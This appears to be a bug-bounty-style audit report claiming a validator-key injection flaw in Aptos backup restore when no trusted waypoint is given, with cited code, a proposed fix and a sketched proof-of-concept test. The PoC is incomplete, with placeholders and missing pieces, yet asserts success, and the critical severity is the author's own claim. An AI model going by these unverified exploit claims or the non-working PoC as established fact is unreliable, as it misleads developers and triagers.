# Audit Report

## Title
Critical Validator Key Injection Vulnerability in Backup Restore Without Trusted Waypoints

## Summary
The backup restore process in `aptos-core/storage/backup/backup-cli/` allows an attacker to inject malicious validator public keys when restoring from backups without trusted waypoints. An attacker can create a malicious backup file containing their own validator keys, and when a victim restores from this backup without providing the `--trust-waypoint` parameter, the system accepts the attacker's validator set without any cryptographic verification, allowing complete blockchain takeover.

## Finding Description

The vulnerability exists in the epoch ending restore logic where the first epoch's validator set can be injected without verification when no trusted waypoints are provided.

The `load_json_file()` function simply deserializes JSON data without cryptographic validation: [1](#0-0) 

This function loads the `EpochEndingBackup` manifest which contains waypoints, but these waypoints are part of the attacker-controlled backup file itself, not from a trusted source. [2](#0-1) 

The critical vulnerability occurs in the verification logic during restoration. Trusted waypoints are optional CLI parameters: [3](#0-2) 

When restoring the first epoch without trusted waypoints, the verification logic has a critical gap: [4](#0-3) 

For the **first LedgerInfo** when `previous_li` is `None`:
1. Lines 119-128 verify the waypoint in the manifest matches the LedgerInfo - but both are attacker-controlled
2. Lines 129-135 check for a trusted waypoint - if none provided, this is skipped
3. Lines 136-146 check using previous LedgerInfo - but `previous_li` is `None` for the first epoch, so this is skipped
4. **Result: NO cryptographic verification happens**

The waypoint structure includes the validator set in `next_epoch_state`: [5](#0-4) 

An attacker exploits this by:
1. Generating their own validator keypairs
2. Creating a malicious `LedgerInfo` with `next_epoch_state` containing attacker's validator keys
3. Calculating the waypoint for this LedgerInfo (which hashes the malicious validator set)
4. Creating a JSON manifest with this calculated waypoint
5. Creating BCS-encoded chunk files with the malicious `LedgerInfoWithSignatures`

When a victim restores without `--trust-waypoint`, the verification in the restore process passes because the attacker made the manifest waypoint match the malicious LedgerInfo. The system then accepts the attacker's validator set as legitimate.

Test code confirms this vulnerability is exploitable: [6](#0-5) 

Line 86 shows `TrustedWaypointOpt::default()` (empty waypoints) and line 96 passes `None` for previous epoch - exactly the vulnerable scenario.

## Impact Explanation

**Critical Severity** - This vulnerability enables:

1. **Consensus/Safety Violation**: The victim node syncs to a completely fake blockchain controlled by the attacker, breaking the fundamental consensus invariant that all honest nodes agree on the same chain

2. **Loss of Funds**: The attacker can construct fraudulent transactions on their fake chain, potentially stealing funds or creating counterfeit assets that appear valid to the victim node

3. **Validator Set Manipulation**: The attacker gains complete control over the validator set, allowing them to sign any blocks they want without needing actual validator stake

4. **Non-Recoverable Network Partition**: If multiple nodes restore from the malicious backup, they would form a separate network partition that cannot reconcile with the legitimate chain without a hardfork

This meets the **Critical Severity** criteria per the Aptos Bug Bounty program (up to $1,000,000) as it causes consensus violations and complete loss of blockchain integrity.

## Likelihood Explanation

**High Likelihood** - This vulnerability is highly likely to be exploited because:

1. **Simple Attack Vector**: The attacker only needs to distribute malicious backup files through unofficial channels or compromised backup sources

2. **Common Operational Scenario**: Node operators frequently restore from backups during:
   - Initial node setup
   - Disaster recovery
   - Migration to new hardware
   - Testing/development environments

3. **Low Attacker Requirements**: No special privileges needed - just the ability to craft backup files and convince victims to use them

4. **Documentation Gap**: The backup-cli help text indicates trusted waypoints are optional, not required for security

5. **No Warning**: The system provides no warning when restoring without trusted waypoints, making the vulnerability invisible to operators

The only barrier is that operators need to obtain backups from the attacker's source, which could happen through:
- Unofficial backup repositories
- Compromised backup servers
- Social engineering ("faster bootstrap from this mirror")
- Supply chain attacks on backup infrastructure

## Recommendation

**Immediate Fix**: Make trusted waypoints mandatory for epoch ending restore operations when no previous epoch exists.

Modify the restore verification logic:

```rust
// In storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs
// In preheat_impl() function around line 136

} else if let Some(pre_li) = previous_li {
    pre_li
        .ledger_info()
        .next_epoch_state()
        .ok_or_else(|| {
            anyhow!(
                "Next epoch state not found from LI at epoch {}.",
                pre_li.ledger_info().epoch()
            )
        })?
        .verify(&li)?;
} else {
    // NEW: Require trusted waypoint for first epoch
    return Err(anyhow!(
        "First epoch (epoch {}) must be verified with a trusted waypoint. \
        No previous LedgerInfo available for signature verification. \
        Please provide --trust-waypoint with the correct genesis waypoint.",
        li.ledger_info().epoch()
    ));
}
```

**Additional Hardening**:

1. Auto-inject mainnet/testnet genesis waypoints in backup-cli (not just execution config)
2. Add prominent warnings in CLI help text about security implications
3. Log WARNING when restoring without trusted waypoints
4. Require explicit `--allow-untrusted-restore` flag to bypass waypoint checks (with scary warnings)

## Proof of Concept

```rust
// PoC demonstrating malicious backup creation and vulnerable restore
// This would be added as a test in storage/backup/backup-cli/src/backup_types/epoch_ending/

#[test]
fn test_malicious_validator_injection() {
    use crate::{
        backup_types::epoch_ending::{
            manifest::{EpochEndingBackup, EpochEndingChunk},
            restore::{EpochEndingRestoreController, EpochEndingRestoreOpt},
        },
        storage::{local_fs::LocalFs, FileHandle},
        utils::{GlobalRestoreOpt, TrustedWaypointOpt, RocksdbOpt, 
                ConcurrentDownloadsOpt, ReplayConcurrencyLevelOpt},
    };
    use aptos_crypto::bls12381;
    use aptos_temppath::TempPath;
    use aptos_types::{
        validator_signer::ValidatorSigner,
        validator_verifier::{ValidatorVerifier, ValidatorConsensusInfo},
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures, generate_ledger_info_with_sig},
        block_info::BlockInfo,
        epoch_state::EpochState,
        waypoint::Waypoint,
        on_chain_config::ValidatorSet,
    };
    use std::sync::Arc;
    
    // 1. Attacker creates malicious validator keys
    let attacker_signer = ValidatorSigner::random([0u8; 32]);
    let attacker_validator_info = ValidatorConsensusInfo::new(
        attacker_signer.author(),
        attacker_signer.public_key(),
        1000, // voting power
    );
    let attacker_verifier = ValidatorVerifier::new(vec![attacker_validator_info]);
    
    // 2. Create malicious genesis LedgerInfo with attacker's validator set
    let validator_set = ValidatorSet::new(vec![/* attacker's validator */]);
    let mut malicious_ledger_info = LedgerInfo::genesis(
        HashValue::random(), // state root
        validator_set
    );
    
    // 3. Create LedgerInfoWithSignatures (even without valid signatures)
    let malicious_li_with_sigs = LedgerInfoWithSignatures::new(
        malicious_ledger_info.clone(),
        AggregateSignature::empty(), // No valid signatures needed!
    );
    
    // 4. Calculate waypoint for malicious LedgerInfo
    let malicious_waypoint = Waypoint::new_epoch_boundary(&malicious_ledger_info).unwrap();
    
    // 5. Create malicious backup manifest with calculated waypoint
    let backup_dir = TempPath::new();
    backup_dir.create_as_dir().unwrap();
    let storage = Arc::new(LocalFs::new(backup_dir.path().to_path_buf()));
    
    // Write malicious chunk file with BCS-encoded LedgerInfoWithSignatures
    let chunk_handle = FileHandle::new("epoch_0_chunk");
    // ... write malicious_li_with_sigs to chunk ...
    
    // Create manifest JSON with malicious waypoint
    let manifest = EpochEndingBackup {
        first_epoch: 0,
        last_epoch: 0,
        waypoints: vec![malicious_waypoint], // Attacker's calculated waypoint
        chunks: vec![EpochEndingChunk {
            first_epoch: 0,
            last_epoch: 0,
            ledger_infos: chunk_handle,
        }],
    };
    
    // 6. Victim restores without trusted waypoints
    let tgt_db_dir = TempPath::new();
    tgt_db_dir.create_as_dir().unwrap();
    
    let restore_result = tokio::runtime::Runtime::new().unwrap().block_on(
        EpochEndingRestoreController::new(
            EpochEndingRestoreOpt { 
                manifest_handle: /* manifest handle */ 
            },
            GlobalRestoreOpt {
                db_dir: Some(tgt_db_dir.path().to_path_buf()),
                target_version: Some(0),
                trusted_waypoints: TrustedWaypointOpt::default(), // NO TRUSTED WAYPOINTS!
                rocksdb_opt: RocksdbOpt::default(),
                concurrent_downloads: ConcurrentDownloadsOpt::default(),
                replay_concurrency_level: ReplayConcurrencyLevelOpt::default(),
                enable_state_indices: false,
            }
            .try_into()
            .unwrap(),
            storage,
        )
        .run(None) // No previous epoch
    );
    
    // VULNERABILITY: This should fail but succeeds!
    // The malicious validator set is accepted without verification
    assert!(restore_result.is_ok());
    
    // The restored database now trusts the attacker's validator keys
    // All subsequent blocks signed by attacker will be accepted
}
```

**Notes**

The vulnerability requires victims to restore from attacker-controlled backups without providing trusted waypoints. While this might seem like an operational error, the current implementation provides no safeguards, warnings, or requirements to prevent it. The backup-cli tool's design treats trusted waypoints as optional, when they should be mandatory for security-critical first epoch verification. This creates a significant attack surface for supply chain attacks, compromised backup infrastructure, or social engineering campaigns targeting node operators.

### Citations

**File:** storage/backup/backup-cli/src/utils/storage_ext.rs (L35-37)
```rust
    async fn load_json_file<T: DeserializeOwned>(&self, file_handle: &FileHandleRef) -> Result<T> {
        Ok(serde_json::from_slice(&self.read_all(file_handle).await?)?)
    }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L81-83)
```rust
        let manifest: EpochEndingBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
        manifest.verify()?;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L107-151)
```rust
            for li in lis {
                if li.ledger_info().version() > self.target_version {
                    past_target = true;
                    break;
                }

                ensure!(
                    li.ledger_info().epoch() == next_epoch,
                    "LedgerInfo epoch not expected. Expected: {}, actual: {}.",
                    li.ledger_info().epoch(),
                    next_epoch,
                );
                let wp_manifest = waypoint_iter.next().ok_or_else(|| {
                    anyhow!("More LedgerInfo's found than waypoints in manifest.")
                })?;
                let wp_li = Waypoint::new_epoch_boundary(li.ledger_info())?;
                ensure!(
                    *wp_manifest == wp_li,
                    "Waypoints don't match. In manifest: {}, In chunk: {}",
                    wp_manifest,
                    wp_li,
                );
                if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
                    ensure!(
                        *wp_trusted == wp_li,
                        "Waypoints don't match. In backup: {}, trusted: {}",
                        wp_li,
                        wp_trusted,
                    );
                } else if let Some(pre_li) = previous_li {
                    pre_li
                        .ledger_info()
                        .next_epoch_state()
                        .ok_or_else(|| {
                            anyhow!(
                                "Next epoch state not found from LI at epoch {}.",
                                pre_li.ledger_info().epoch()
                            )
                        })?
                        .verify(&li)?;
                }
                ledger_infos.push(li);
                previous_li = ledger_infos.last();
                next_epoch += 1;
            }
```

**File:** storage/backup/backup-cli/src/utils/mod.rs (L331-346)
```rust
#[derive(Clone, Default, Parser)]
pub struct TrustedWaypointOpt {
    #[clap(
        long,
        help = "(multiple) When provided, an epoch ending LedgerInfo at the waypoint version will be \
        checked against the hash in the waypoint, but signatures on it are NOT checked. \
        Use this for two purposes: \
        1. set the genesis or the latest waypoint to confirm the backup is compatible. \
        2. set waypoints at versions where writeset transactions were used to overwrite the \
        validator set, so that the signature check is skipped. \
        N.B. LedgerInfos are verified only when restoring / verifying the epoch ending backups, \
        i.e. they are NOT checked at all when doing one-shot restoring of the transaction \
        and state backups."
    )]
    pub trust_waypoint: Vec<Waypoint>,
}
```

**File:** types/src/waypoint.rs (L129-147)
```rust
#[derive(Deserialize, Serialize, CryptoHasher, BCSCryptoHash)]
struct Ledger2WaypointConverter {
    epoch: u64,
    root_hash: HashValue,
    version: Version,
    timestamp_usecs: u64,
    next_epoch_state: Option<EpochState>,
}

impl Ledger2WaypointConverter {
    pub fn new(ledger_info: &LedgerInfo) -> Self {
        Self {
            epoch: ledger_info.epoch(),
            root_hash: ledger_info.transaction_accumulator_hash(),
            version: ledger_info.version(),
            timestamp_usecs: ledger_info.timestamp_usecs(),
            next_epoch_state: ledger_info.next_epoch_state().cloned(),
        }
    }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/tests.rs (L79-98)
```rust
    rt.block_on(
        EpochEndingRestoreController::new(
            EpochEndingRestoreOpt { manifest_handle },
            GlobalRestoreOpt {
                db_dir: Some(tgt_db_dir.path().to_path_buf()),
                dry_run: false,
                target_version: Some(target_version),
                trusted_waypoints: TrustedWaypointOpt::default(),
                rocksdb_opt: RocksdbOpt::default(),
                concurrent_downloads: ConcurrentDownloadsOpt::default(),
                replay_concurrency_level: ReplayConcurrencyLevelOpt::default(),
                enable_state_indices: false,
            }
            .try_into()
            .unwrap(),
            store,
        )
        .run(None),
    )
    .unwrap();
```
